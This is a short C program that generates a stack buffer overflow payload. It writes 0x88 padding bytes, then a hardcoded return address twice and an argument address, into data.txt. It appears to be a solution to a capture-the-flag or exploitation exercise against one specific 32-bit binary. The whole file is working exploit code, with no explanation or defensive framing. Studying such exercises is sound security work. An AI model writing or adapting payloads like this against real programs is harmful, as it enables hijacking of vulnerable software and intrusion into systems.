#include <stdio.h>

int main (int argc, const char * argv[]) {
	FILE * fp = fopen("data.txt", "w");
	void * retAddr = (void *)0x80484b1;
	void * retArg = (void *)0x08048610;
	const char * retAddrData = (const char *)&retAddr;
	const char * retArgData = (const char *)&retArg;
	int i;
	for (i = 0; i < 0x88; i++) {
		fprintf(fp, "a");
	}
	fwrite(retAddrData, 4, 1, fp);
	fwrite(retAddrData, 4, 1, fp);
	fwrite(retArgData, 4, 1, fp);
	fprintf(fp, "\n");
	fclose(fp);
	return 0;
}
